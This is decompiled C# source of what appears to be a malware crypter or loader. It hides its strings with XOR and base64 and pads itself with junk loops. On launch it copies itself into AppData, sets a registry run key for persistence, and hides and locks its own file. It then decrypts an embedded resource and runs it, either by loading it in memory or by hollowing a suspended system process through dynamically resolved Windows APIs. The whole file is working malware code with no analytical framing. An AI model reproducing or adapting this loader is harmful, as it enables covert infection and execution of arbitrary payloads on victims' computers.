using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns1;

[StandardModule]
internal sealed class Class5
{
	public delegate bool Delegate0(string string_0, string string_1, IntPtr intptr_0, IntPtr intptr_1, bool bool_0, int int_0, IntPtr intptr_2, string string_2, byte[] byte_0, IntPtr[] intptr_3);

	public delegate bool Delegate1(IntPtr intptr_0, uint[] uint_0);

	public delegate bool Delegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, IntPtr intptr_3, ref IntPtr intptr_4);

	public delegate uint Delegate3(IntPtr intptr_0, IntPtr intptr_1);

	public delegate IntPtr Delegate4(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool Delegate5(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, IntPtr intptr_2, ref IntPtr intptr_3);

	public delegate int Delegate6(IntPtr intptr_0);

	private static sbyte sbyte_0 = -57;

	private static float float_0 = 30381.975f;

	public static byte[] smethod_0(DateTime dateTime_0, byte[] byte_0, sbyte sbyte_1, long long_0)
	{
		byte[] array = new byte[17]
		{
			99, 17, 136, 20, 151, 208, 11, 204, 203, 255,
			128, 17, 171, 47, 109, 143, 196
		};
		sbyte b = 11;
		checked
		{
			do
			{
				b = (sbyte)unchecked(b + 1);
			}
			while (b <= 115);
			int num = array.Length;
			short num2 = 3;
			do
			{
				num2 = (short)unchecked(num2 + 1);
			}
			while (num2 <= 25);
			int num3 = byte_0.Length - 1;
			for (int i = 0; i <= num3; i++)
			{
				string text = "*{c";
				int j = 0;
				for (int length = text.Length; j < length; j++)
				{
					_ = text[j];
				}
				byte_0[i] = unchecked((byte)(byte_0[i] ^ array[i % num]));
			}
			return byte_0;
		}
	}

	public static string smethod_1(uint uint_0, string string_0, byte byte_0, string string_1)
	{
		string text = "keX(QbV";
		int i = 0;
		for (int length = text.Length; i < length; i = checked(i + 1))
		{
			_ = text[i];
		}
		return Encoding.UTF8.GetString(smethod_0(DateTime.Now, Convert.FromBase64String(string_0), 96, 1899218114L));
	}

	public static void smethod_2()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		string text = default(string);
		string text2 = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 399:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							case 0:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
							goto IL_0046;
						case 6:
						case 7:
							goto IL_0062;
						case 8:
							goto IL_006c;
						case 9:
						case 10:
							goto IL_0075;
						case 11:
							goto IL_008d;
						case 13:
							goto IL_00a3;
						case 14:
							goto IL_00a6;
						case 15:
							goto IL_00b5;
						case 12:
						case 16:
						case 17:
							goto IL_00c9;
						case 18:
							goto IL_00f3;
						case 19:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 5:
						case 20:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00f3:
					num = 18;
					NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", new object[2]
					{
						smethod_1(0u, "K1rLQcuDRIqfqMFD7nMg5qcRfvt78aRXm6KR5H7cXDHMsRFj7Xrjhm6+uJbvf/d9GOE=", 253, "\\Fa_") + text,
						text2 + text
					}, (string[])null, (Type[])null, (bool[])null, true);
					break;
					IL_00c9:
					num = 17;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(smethod_1(1789764241u, "FGLrZv6gf+K4l+V9xw==", 63, "G6=VdPo"), ""));
					goto IL_00f3;
					IL_0009:
					num = 2;
					text = smethod_1(257617085u, "PyCwOvKobg==", 0, "Sqn");
					goto IL_0021;
					IL_0021:
					num = 3;
					text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + smethod_1(543508342u, "LnjrZvijZKq/o9No2FsI4pgwdPpi/rNuvw==", 25, "2)Pm=K");
					goto IL_0046;
					IL_0046:
					num = 4;
					if (Operators.CompareString(Application.get_ExecutablePath(), text2 + text, false) == 0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0062;
					IL_0062:
					num = 7;
					if (!Directory.Exists(text2))
					{
						goto IL_006c;
					}
					goto IL_0075;
					IL_006c:
					num = 8;
					Directory.CreateDirectory(text2);
					goto IL_0075;
					IL_0075:
					num = 10;
					if (Operators.CompareString(Application.get_ExecutablePath(), text2 + text, false) != 0)
					{
						goto IL_008d;
					}
					goto IL_00a3;
					IL_008d:
					num = 11;
					File.Copy(Application.get_ExecutablePath(), text2 + text);
					goto IL_00c9;
					IL_00a3:
					num = 13;
					goto IL_00a6;
					IL_00a6:
					num = 14;
					File.Delete(text2 + text);
					goto IL_00b5;
					IL_00b5:
					num = 15;
					File.Copy(Application.get_ExecutablePath(), text2 + text);
					goto IL_00c9;
					end_IL_0001_2:
					break;
				}
				num = 19;
				NewLateBinding.LateCall(objectValue, (Type)null, "regwrite", new object[2]
				{
					smethod_1(0u, "K1rEWcuDRIqfqMFD7nMg5qcRfvt78aRXm6KR5H7cXDHMsRFj7Xrjhm6+uJbvf/d9GOE=", 185, "`%q4p") + text,
					text2 + text
				}, (string[])null, (Type[])null, (bool[])null, true);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 399;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static int smethod_3(int int_0, uint uint_0, uint uint_1, byte[] byte_0, float float_1)
	{
		byte b = 7;
		checked
		{
			do
			{
				sbyte b2 = 0;
				do
				{
					b2 = (sbyte)unchecked(b2 + 1);
				}
				while (b2 <= 118);
				ushort num = 13;
				do
				{
					new decimal(-414739202L);
					num = (ushort)unchecked((uint)(num + 1));
				}
				while (unchecked((uint)num) <= 111u);
				b = (byte)unchecked((uint)(b + 1));
			}
			while (unchecked((uint)b) <= 97u);
			return Color.FromArgb(byte_0[int_0 + 3], byte_0[int_0 + 2], byte_0[int_0 + 1], byte_0[int_0]).ToArgb();
		}
	}

	public static byte[] smethod_4(decimal decimal_0, int int_0, bool bool_0)
	{
		double num = 0.0;
		do
		{
			num += 1.0;
		}
		while (num <= 73.0);
		byte b = 15;
		do
		{
			ushort num2 = 0;
			checked
			{
				do
				{
					num2 = (ushort)unchecked((uint)(num2 + 1));
				}
				while (unchecked((uint)num2) <= 70u);
				b = (byte)unchecked((uint)(b + 1));
			}
		}
		while ((uint)b <= 50u);
		new decimal(1804370397L);
		Color color = Color.FromArgb(int_0);
		return new byte[4] { color.B, color.G, color.R, color.A };
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr LoadLibrary(string string_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, string string_0);

	public static T smethod_5<T>(string string_0)
	{
		return Conversions.ToGenericParameter<T>((object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibrary(string_0.Split(new char[1] { Convert.ToChar(58) })[0]), string_0.Split(new char[1] { Convert.ToChar(58) })[1]), typeof(T)));
	}

	public static void smethod_6(object object_0)
	{
		int num = 14;
		do
		{
			num = checked(num + 1);
		}
		while (num <= 30);
		MethodInfo entryPoint = Assembly.Load((byte[])object_0).EntryPoint;
		if (entryPoint.GetParameters().Length == 0)
		{
			entryPoint.Invoke(null, null);
			return;
		}
		entryPoint.Invoke(null, new object[1] { new string[0] });
	}

	public static void smethod_7(byte[] byte_0, sbyte sbyte_1, long long_0)
	{
		int num = 0;
		checked
		{
			do
			{
				num++;
			}
			while (num <= 100);
			int num2 = 0;
			do
			{
				num2++;
			}
			while (num2 <= 59);
			if (byte_0[60] == 128)
			{
				Thread thread = new Thread(smethod_6);
				thread.SetApartmentState(ApartmentState.STA);
				byte b = 0;
				do
				{
					for (int i = b; i <= 30 && i != 25; i++)
					{
					}
					b = (byte)unchecked((uint)(b + 1));
				}
				while (unchecked((uint)b) <= 20u);
				thread.Start(byte_0);
				return;
			}
			string string_ = Assembly.GetEntryAssembly()!.Location;
			if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1(1867928525u, "WU3YZvi3ea2m38Z4x0oer+wbKb49", 51, "3}tU[3 +PbFL")))
			{
				string[] directories = Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + smethod_1(0u, "WU3fffm0ZLu4o814yF0C/KsFZaZa0oRXirme7XTcQB/k", 103, "F8OTq!^6ns"));
				foreach (string text in directories)
				{
					if (text.ToLower().Contains(smethod_1(810859785u, "FSOmJLk=", 0, "\\,B\\R#&")))
					{
						string_ = text + smethod_1(1086913531u, "P3L+YOW1eOKuh+U=", 206, "5z3,!40'Le");
						break;
					}
				}
			}
			byte[] array = new byte[6] { 0, 1, 2, 3, 4, 5 };
			int[] array2 = new int[8] { 1, 16, 2, 32, 4, 64, 4, 64 };
			int num3 = smethod_3(60, 2067598386u, 1272303778u, byte_0, 15114.857f);
			int num4 = BitConverter.ToInt16(byte_0, num3 + 6);
			IntPtr intptr_ = new IntPtr(smethod_3(num3 + 84, 40228711u, 648270097u, byte_0, 20605.26f));
			IntPtr[] array3 = new IntPtr[4];
			IntPtr intPtr = default(IntPtr);
			if (!smethod_5<Delegate0>(smethod_1(829882743u, "CHT6evK8OP7xvPJ0ylsI37YMcu1n5JE=", 214, "RD1RO"))(null, string_, intPtr, intPtr, bool_0: false, 4, intPtr, null, new byte[0], array3))
			{
				return;
			}
			try
			{
				sbyte b2 = 15;
				do
				{
					b2 = (sbyte)unchecked(b2 + 1);
				}
				while (b2 <= 85);
				uint[] array4 = new uint[179];
				array4[0] = 65538u;
				if (smethod_5<Delegate1>(smethod_1(1048674511u, "CHT6evK8OP7xuOVl/0cf6qUHUud647VzuA==", 0, "E5cStDtO#"))(array3[1], array4))
				{
					Delegate2 @delegate = smethod_5<Delegate2>(smethod_1(0u, "CHT6evK8OP7xreVwz38f4KcGYvtZ8r1kvrI=", 198, "{A"));
					IntPtr intptr_2 = array3[0];
					IntPtr intPtr2 = new IntPtr(unchecked((long)array4[41]) + 8L);
					IntPtr intptr_3 = intPtr2;
					IntPtr intptr_4 = new IntPtr(4);
					IntPtr intptr_5 = default(IntPtr);
					IntPtr intptr_6 = default(IntPtr);
					if (@delegate(intptr_2, intptr_3, ref intptr_5, intptr_4, ref intptr_6) && unchecked((long)smethod_5<Delegate3>(smethod_1(1957034370u, "DWXsePvqRbieke1w23kE6rMsd9tx9KRio6U=", 190, "PEd<)"))(array3[0], intptr_5)) == 0L)
					{
						Delegate4 delegate2 = smethod_5<Delegate4>(smethod_1(1687912171u, "CHT6evK8OP7xqelj31oM44UPfed30qg=", 212, "Ud@5Y"));
						IntPtr intptr_7 = array3[0];
						intptr_4 = new IntPtr(smethod_3(num3 + 52, 652399256u, 629009561u, byte_0, -23958.6f));
						IntPtr intptr_8 = intptr_4;
						intPtr2 = new IntPtr(smethod_3(num3 + 80, 369215726u, 278782485u, byte_0, 31703.178f));
						IntPtr intptr_9 = delegate2(intptr_7, intptr_8, intPtr2, 12288, 64);
						Delegate5 delegate3 = smethod_5<Delegate5>(smethod_1(254834453u, "CHT6evK8OP7xqPJ430o9/asAdPtn2rVmo7mG", 178, "#Ro9tm"));
						delegate3(array3[0], intptr_9, byte_0, intptr_, ref intptr_6);
						int[] array5 = new int[10];
						int num5 = num4 - 1;
						for (int k = 0; k <= num5; k++)
						{
							array5[0] = 13;
							array5[5] = 255 + array5[0];
							Buffer.BlockCopy(byte_0, num3 + 248 + k * 40, array5, 0, 40);
							byte[] array6 = new byte[array5[4] - 1 + 1];
							Buffer.BlockCopy(byte_0, array5[5], array6, 0, array6.Length);
							array5.Length.ToString();
							IntPtr intptr_10 = array3[0];
							intptr_4 = new IntPtr(intptr_9.ToInt32() + array5[3]);
							IntPtr intptr_11 = intptr_4;
							intPtr2 = new IntPtr(array6.Length);
							delegate3(intptr_10, intptr_11, array6, intPtr2, ref intptr_6);
						}
						IntPtr intptr_12 = array3[0];
						intptr_4 = new IntPtr(unchecked((long)array4[41]) + 8L);
						IntPtr intptr_13 = intptr_4;
						byte[] byte_ = smethod_4(new decimal(196911963L), intptr_9.ToInt32(), bool_0: true);
						intPtr2 = new IntPtr(4);
						delegate3(intptr_12, intptr_13, byte_, intPtr2, ref intptr_6);
						array4[44] = (uint)(intptr_9.ToInt32() + smethod_3(num3 + 40, 1648229350u, 1926777833u, byte_0, -16365f));
						smethod_5<Delegate1>(smethod_1(561575926u, "CHT6evK8OP7xrOVl/0cf6qUHUud647VzuA==", 246, "CHN4E D[7"))(array3[1], array4);
						smethod_5<Delegate6>(smethod_1(107514653u, "CHT6evK8OP7xreVi3kII26wRdOlw", 192, "XI=iyVzA"))(array3[1]);
						return;
					}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			Process.GetProcessById(array3[2].ToInt32()).Kill();
		}
	}

	[STAThread]
	public static void Main()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		ResourceManager resourceManager = default(ResourceManager);
		long num5 = default(long);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 199:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							default:
								goto end_IL_0001;
							case 1:
								break;
							case 0:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001d;
						case 5:
							goto IL_002a;
						case 6:
							goto IL_0039;
						case 7:
							goto IL_0053;
						case 8:
							goto IL_0055;
						case 9:
							goto IL_0061;
						case 10:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 0:
							goto end_IL_0001;
						case 11:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0061:
					num = 9;
					resourceManager = new ResourceManager("anj3flyb", Assembly.GetExecutingAssembly());
					break;
					IL_0055:
					num = 8;
					Thread.Sleep(2077);
					goto IL_0061;
					IL_0009:
					num = 2;
					smethod_2();
					goto IL_0010;
					IL_0010:
					num = 3;
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.Hidden);
					goto IL_001d;
					IL_001d:
					num = 4;
					File.SetAttributes(Application.get_ExecutablePath(), FileAttributes.ReadOnly);
					goto IL_002a;
					IL_002a:
					num = 5;
					num5 = 12L;
					goto IL_0039;
					IL_0039:
					do
					{
						num = 6;
						num5 = checked(num5 + 1L);
					}
					while (num5 <= 86L);
					goto IL_0053;
					IL_0053:
					num = 7;
					goto IL_0055;
					end_IL_0001_2:
					break;
				}
				num = 10;
				smethod_7(smethod_0(DateTime.Now, (byte[])resourceManager.GetObject(smethod_1(773362765u, "V3T6bPqqbr4=", 227, "Rs4d.")), -25, -268207923L), -15, 105222515L);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 199;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
